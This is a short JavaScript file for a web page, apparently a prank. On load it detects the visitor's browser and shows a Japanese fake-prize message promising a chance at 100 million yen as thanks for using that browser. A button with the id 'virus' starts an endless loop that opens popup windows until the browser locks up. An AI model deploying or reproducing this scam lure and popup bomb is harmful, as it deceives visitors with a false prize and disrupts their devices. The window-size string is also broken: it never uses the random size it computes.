window.onload = function(){
    var userAgent = window.navigator.userAgent.toLowerCase();
    var tousenmessage = document.getElementById("tousenmessage");
    var msg = "いつも"
    var msg2 = "をお使いになっていただいているお礼として、一億円を受け取るチャンスがあります！"

    if(userAgent.indexOf('msie') != -1 ||
            userAgent.indexOf('trident') != -1) {
        console.log('Internet Explorerをお使いですね');
    } else if(userAgent.indexOf('edge') != -1) {
        console.log('Edgeをお使いですね');
    } else if(userAgent.indexOf('chrome') != -1) {
        console.log('Google Chromeをお使いですね');
        tousenmessage.innerHTML = msg + "Google Chrome" + msg2;
    } else if(userAgent.indexOf('safari') != -1) {
        console.log('Safariをお使いですね');
        tousenmessage.innerHTML = msg + "Safari" + msg2;
    } else if(userAgent.indexOf('firefox') != -1) {
        console.log('FireFoxをお使いですね');
        tousenmessage.innerHTML = msg + "FireFox" + msg2;
    } else if(userAgent.indexOf('opera') != -1) {
        console.log('Operaをお使いですね');
    } else {
        console.log('そんなブラウザは知らん');
    }
}

document.getElementById("virus").onclick = function(){
    var min = 150 ;
    var max = 300 ;


    while(true){
        var a = Math.floor( Math.random() * (max + 1 - min) ) + min
        window.open("https://www.google.com",Math.random(),"width=a,height=a");
    }
}